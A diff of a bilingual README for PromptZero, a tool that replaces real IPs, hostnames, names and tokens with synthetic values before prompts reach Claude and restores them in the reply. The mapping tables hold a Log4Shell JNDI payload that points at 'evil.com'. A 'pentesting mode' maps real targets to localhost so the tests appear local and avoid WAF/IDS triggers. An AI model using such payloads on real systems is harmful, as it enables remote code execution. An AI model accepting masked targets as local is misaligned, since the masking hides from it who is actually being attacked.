@@ -83,21 +83,21 @@ PromptZero fixes this.
 YOUR PROMPT (real data)              WHAT CLAUDE SEES (synthetic)
 ══════════════════════════           ════════════════════════════════
 192.168.1.45              ────▶      127.0.0.1
-db.prod.company.com       ────▶      localhost.localdomain.1
+db.prod.company.com       ────▶      alpha.localhost
 admin@company.com         ────▶      user001@fakecorp.local
 John Smith                ────▶      Alice Harrington          (NLP)
 Acme Financial S.A.       ────▶      Globex Industries         (NLP)
 +54 11 4444-5555          ────▶      +1-555-000-0001
 DNI 28.456.123            ────▶      FAKE-ID-000001
 sk-ant-api03-xxxxx...     ────▶      FAKE_TOKEN_0001_xxxxxxxx
-${jndi:ldap://evil.com/x} ────▶      ${jndi:ldap://localhost.localdomain.2/x}
+${jndi:ldap://evil.com/x} ────▶      ${jndi:ldap://bravo.localhost/x}
 
 
 CLAUDE'S RESPONSE (synthetic)        YOU RECEIVE (real data restored)
 ════════════════════════════         ═════════════════════════════════
 "127.0.0.1 shows signs    ────▶      "192.168.1.45 shows signs
  of lateral movement to               of lateral movement to
- localhost.localdomain.1"             db.prod.company.com"
+ alpha.localhost"             db.prod.company.com"
 ```
 
 ---
@@ -108,9 +108,9 @@ CLAUDE'S RESPONSE (synthetic)        YOU RECEIVE (real data restored)
 |---|---|---|
 | IPv4 address | `203.0.113.50` → `127.0.0.1` | Regex |
 | IPv6 address | `2001:db8::1` → `::1` | Regex |
-| Hostname / FQDN | `vpn.corp.com` → `localhost.localdomain.1` | Regex |
-| URL | `https://api.corp.com/v2` → `https://localhost.localdomain.2/v2` | Regex |
-| host:port | `db.internal:5432` → `localhost.localdomain.3:5432` | Regex |
+| Hostname / FQDN | `vpn.corp.com` → `alpha.localhost` | Regex |
+| URL | `https://api.corp.com/v2` → `https://bravo.localhost/v2` | Regex |
+| host:port | `db.internal:5432` → `charlie.localhost:5432` | Regex |
 | Email | `john@corp.com` → `user001@fakecorp.local` | Regex + NLP |
 | Phone (US/CA) | `+1-555-123-4567` → `+1-555-000-0001` | Regex + NLP |
 | Phone (LatAm + ES) | `+54 11 4444-5555`, `+56 9 1234 5678`, `+34 612 345 678`, `+52 55 1234 5678`, `+57 300 123 4567`, `+598 99 123 456` → `+1-555-000-0001` | **Regex (LatAm/ES)** |
@@ -130,7 +130,7 @@ CLAUDE'S RESPONSE (synthetic)        YOU RECEIVE (real data restored)
 | IBAN | `GB29NWBK60161331926819`, `AR1500011110000…` → `FAKEIBAN000…` | NLP |
 | API key / Token | `sk-ant-api03-xxxxxx...` → `FAKE_TOKEN_0001_xxxxxxxx` | Regex |
 
-> **Pentesting mode:** IPs map to `127.0.0.x` and hostnames to `localhost.localdomain.x` —
+> **Pentesting mode:** IPs map to `127.0.0.x` and hostnames to `<word>.localhost` —
 > this frames your tests as local, avoids WAF/IDS triggers, and is accurate since you're
 > running tests from a controlled environment anyway.
 
@@ -188,7 +188,7 @@ Session: "pentest-acmecorp-2024"
 Real value                   Synthetic value
 ─────────────────────────────────────────────────
 192.168.1.45        ←──────▶  127.0.0.1
-db.prod.acme.com    ←──────▶  localhost.localdomain.1
+db.prod.acme.com    ←──────▶  alpha.localhost
 John Smith          ←──────▶  Alice Harrington
 admin@acme.com      ←──────▶  user001@fakecorp.local
 ─────────────────────────────────────────────────
@@ -565,7 +565,7 @@ TU ENTORNO
 | Tipo | Dato real | Dato sintético |
 |---|---|---|
 | IP (pentesting) | `192.168.1.45` | `127.0.0.1` |
-| Hostname | `db.prod.empresa.com` | `localhost.localdomain.1` |
+| Hostname | `db.prod.empresa.com` | `alpha.localhost` |
 | Email | `juan@empresa.com` | `user001@fakecorp.local` |
 | Nombre / Apellido | `Juan García` | `Alice Harrington` |
 | Empresa | `Empresa XYZ S.A.` | `Globex Industries` |
@@ -573,10 +573,10 @@ TU ENTORNO
 | DNI / Documento | `28.456.123` | `FAKE-ID-000001` |
 | Tarjeta de crédito | `4111 1111 1111 1234` | `4111-1111-1111-0001` |
 | Token / API key | `sk-ant-api03-xxx...` | `FAKE_TOKEN_0001_xxxxxxxx` |
-| Payload con host | `${jndi:ldap://evil.com}` | `${jndi:ldap://localhost.localdomain.2}` |
+| Payload con host | `${jndi:ldap://evil.com}` | `${jndi:ldap://bravo.localhost}` |
 
 > **Modo pentesting:** Las IPs se mapean a `127.0.0.x` y los hostnames a
-> `localhost.localdomain.x` — esto enmarca los tests como locales, evita alertas
+> `<word>.localhost` — esto enmarca los tests como locales, evita alertas
 > de WAF/IDS y es técnicamente correcto ya que las pruebas se realizan desde
 > infraestructura controlada.
 
